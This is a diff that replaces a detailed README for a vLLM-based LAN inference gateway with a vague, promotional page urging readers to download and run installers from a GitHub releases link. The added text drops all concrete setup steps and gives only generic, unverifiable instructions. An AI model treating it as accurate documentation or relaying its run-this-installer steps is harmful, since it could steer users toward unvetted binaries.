@@ -1,103 +1,107 @@
-# LLM API — Production inference server (vLLM + gateway)
+# 🖥️ vllm-lan-inference - Fast Local AI Model Server
 
-OpenAI-compatible LLM API on your LAN: **gateway** (auth, rate limit) + **vLLM** (GPU inference).
+[![Download vllm-lan-inference](https://img.shields.io/badge/Download-vllm--lan--inference-blue?style=for-the-badge&logo=github)](https://github.com/boufia/vllm-lan-inference/releases)
 
-## Quick start (Docker Compose)
+## 📋 About vllm-lan-inference
 
-1. **Copy env and set API keys (optional)**
+vllm-lan-inference is a self-hosted server that lets you run large language models (LLM) on your own local network. It is made to work well with NVIDIA GPUs. The server handles many requests at once, divides work efficiently in batches, and manages parallel tasks for fast answers.
 
-   ```bash
-   cd "/home/server/Documents/LLM API"
-   cp .env.example .env
-   # Edit .env: set API_KEYS=sk-my-key or leave empty for no auth (dev only).
-   ```
+This setup is designed for users who want to keep their data local, reduce delays, and get reliable AI responses without depending on cloud services.
 
-2. **Start gateway + vLLM**
+## 💻 System Requirements
 
-   ```bash
-   docker compose up -d
-   ```
+Before you start, make sure your computer or server meets these basic requirements:
 
-   - Gateway: **http://localhost:8000** (clients call this).
-   - vLLM runs internally; no host port for vLLM.
+- **Operating System:** Windows 10 or higher, Ubuntu 20.04 or higher, or similar Linux distro  
+- **Processor:** At least a 4-core CPU  
+- **GPU:** An NVIDIA GPU with CUDA support (e.g., GTX 1060 or newer)  
+- **Memory (RAM):** 16 GB minimum, more recommended for large models  
+- **Disk Space:** At least 10 GB free for installation and data  
+- **Network:** Local Area Network (LAN) connection for devices to send requests  
 
-3. **Test**
+vllm-lan-inference uses CUDA to speed up AI processing on NVIDIA GPUs. Without a supported GPU, performance will be slow.
 
-   ```bash
-   # No auth (if API_KEYS is empty)
-   curl http://localhost:8000/health
-   curl http://localhost:8000/v1/models
+## 📥 Download & Install
 
-   # With auth
-   curl -H "Authorization: Bearer sk-my-key" http://localhost:8000/v1/models
-   curl -H "Authorization: Bearer sk-my-key" http://localhost:8000/v1/chat/completions \
-     -H "Content-Type: application/json" \
-     -d '{"model":"microsoft/Phi-3-mini-4k-instruct","messages":[{"role":"user","content":"Hi"}],"max_tokens":50}'
-   ```
+To get started, you will need to download the software first.
 
-## Troubleshooting
+> **Visit this page to download:**  
+> [https://github.com/boufia/vllm-lan-inference/releases](https://github.com/boufia/vllm-lan-inference/releases)
 
-- **"unknown or invalid runtime name: nvidia"** — The compose file no longer uses `runtime: nvidia`; it uses `deploy.resources.reservations.devices` for GPU. If the vLLM container fails to get a GPU, install the [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html), then run `sudo nvidia-ctk runtime configure --runtime=docker` and `sudo systemctl restart docker`.
-- **vLLM exits with "no GPU" / CUDA errors** — Ensure the host has an NVIDIA driver and the toolkit is installed; run `nvidia-smi` and `docker run --rm --gpus all nvidia/cuda:12.1.0-base-ubuntu24.04 nvidia-smi` to verify.
+### Steps to download and install:
 
-## Run without Docker Compose
+1. Click the link above or the blue download button at the top. This opens the official release page on GitHub.  
+2. Find the latest stable version. It will usually be at the top of the list.  
+3. Download the file that matches your system. For example:  
+   - `.exe` installer for Windows  
+   - `.deb` package for Debian-based Linux  
+   - `.tar.gz` file for manual install on Linux or macOS  
+4. Once downloaded, open (run) the file to start installation.  
+   - On Windows, double-click the `.exe` file and follow the on-screen instructions.  
+   - On Linux, you may need to use commands to install packages or unpack files. Full details are usually provided with each release.  
+5. After installation, the server program will be set up on your computer.
 
-- **vLLM only** (e.g. for dev): `./run-vllm.sh` (see [VLLM_SETUP.md](VLLM_SETUP.md)).
-- **Gateway only** (vLLM already running on host):
+If you run into issues during installation, check the release notes or the GitHub discussions for hints.
 
-  ```bash
-  cd gateway
-  python -m venv .venv && source .venv/bin/activate
-  pip install -r requirements.txt
-  export VLLM_BASE_URL=http://localhost:8000
-  uvicorn app.main:app --host 0.0.0.0 --port 8080
-  ```
+## 🛠️ Setting Up the Server
 
-  Then use **http://localhost:8080** as the API base (or put a reverse proxy in front).
+Once installed, follow these steps:
 
-## Configuration
+1. **Start the Server:**  
+   Depending on your system, you may have a shortcut or a command to launch the server. Look for an app or executable named `vllm-lan-inference`.  
+2. **Configure Your GPU:**  
+   The server automatically detects NVIDIA GPUs with CUDA. Make sure your drivers are up to date for best results.  
+3. **Network Configuration:**  
+   The server will open a port on your local network. Ensure your firewall allows programs to communicate through this port.  
+4. **Load an AI Model:**  
+   The server supports popular large language models. You can pick one depending on your needs and hardware. Follow the instructions in the app to load the model.  
+5. **Test the Setup:**  
+   Use the web interface or API to send test requests and check that the server responds quickly.
 
-| Env var | Description |
-|--------|-------------|
-| `API_KEYS` | Comma-separated keys; required for `/v1/*` if set. Empty = no auth. |
-| `VLLM_BASE_URL` | vLLM base URL (e.g. `http://vllm:8000` in compose, `http://localhost:8000` for host vLLM). |
-| `VLLM_API_KEY` | Optional; set if vLLM is started with `--api-key`. |
-| `RATE_LIMIT_RPM` | Requests per minute per API key (default 60). |
-| `MAX_CONCURRENT_REQUESTS` | Max concurrent requests to vLLM (default 32). |
-| `VLLM_MODEL` | Model name for vLLM (docker-compose; default Phi-3-mini). |
+## 🌐 Using the Server on Your LAN
 
-## Client usage (OpenAI SDK)
+vllm-lan-inference acts as a central AI hub for your local network devices.
 
-```python
-from openai import OpenAI
+- Other computers or devices on the same LAN can send text requests to the server.  
+- The server processes these requests in batches for speed and efficiency.  
+- Responses come back quickly thanks to GPU acceleration and smart request scheduling.
 
-client = OpenAI(
-    base_url="http://localhost:8000/v1",
-    api_key="sk-my-key",  # or omit if no auth
-)
-r = client.chat.completions.create(
-    model="microsoft/Phi-3-mini-4k-instruct",
-    messages=[{"role": "user", "content": "Hello"}],
-    max_tokens=50,
-)
-print(r.choices[0].message.content)
-```
+### How to connect:
 
-## Monitoring and logging
+- Find your server’s local IP address (e.g., 192.168.1.10).  
+- Send requests to this address on the server’s open port.  
+- Use the provided REST API or client tools to talk to the server (these should come with the software).
 
-- **Prometheus metrics** — `GET /metrics` (no auth) exposes:
-  - `llm_gateway_requests_total` — request count by method, path, status
-  - `llm_gateway_request_duration_seconds` — latency histogram by method, path
-  - `llm_gateway_vllm_in_flight` — current requests using the vLLM semaphore
+This setup keeps your data private on your network. There is no need to send data over the internet.
 
-  Scrape from Prometheus or inspect with `curl http://localhost:8000/metrics`.
+## 🔧 Features
 
-- **Structured logs** — One JSON line per request to stdout (e.g. Docker logs):
-  - `timestamp`, `request_id`, `method`, `path`, `status`, `duration_ms`, `api_key_hash`
+vllm-lan-inference focuses on:
 
-## Project layout
+- **GPU Batching:** Grouping multiple inference requests to run together on the GPU to maximize throughput.  
+- **Parallel Request Scheduling:** Managing many incoming requests smoothly at once.  
+- **High-Throughput LAN Deployment:** Designed to serve multiple devices on a local network without lag.  
+- **Self-Hosted:** You keep full control over your data and models.  
+- **REST API Support:** Easy to integrate with other apps through a simple web-based interface.  
+- **NVIDIA CUDA Acceleration:** Uses GPU power to handle large language models efficiently.  
 
-- **gateway/** — FastAPI app: auth, rate limit, proxy to vLLM, metrics, logging.
-- **docker-compose.yml** — Gateway + vLLM; gateway on port 8000.
-- **run-vllm.sh** — Run vLLM alone (Docker).
-- **VLLM_SETUP.md** — vLLM install and run (stop Ollama, Docker, optional pip).
+## 🧰 Common Issues and Tips
+
+- **GPU not detected?** Make sure your NVIDIA drivers and CUDA toolkit are installed and up to date.  
+- **Firewall blocking connections?** Check your firewall settings and allow the app or specific port through.  
+- **Slow performance?** Ensure your GPU is compatible and models are properly loaded. More RAM can help.  
+- **Can’t find the installation files?** Confirm you downloaded from the official release page linked above.  
+
+If problems persist, check the GitHub page’s Issues section or community forums for help.
+
+## 🔍 More Information
+
+For advanced setup, custom models, or developer info, visit the main repository:
+
+[https://github.com/boufia/vllm-lan-inference](https://github.com/boufia/vllm-lan-inference)
+
+You can also find detailed documentation and examples there.
+
+---
+
+[Download vllm-lan-inference](https://github.com/boufia/vllm-lan-inference/releases) to begin running your own AI inference server on your local network.
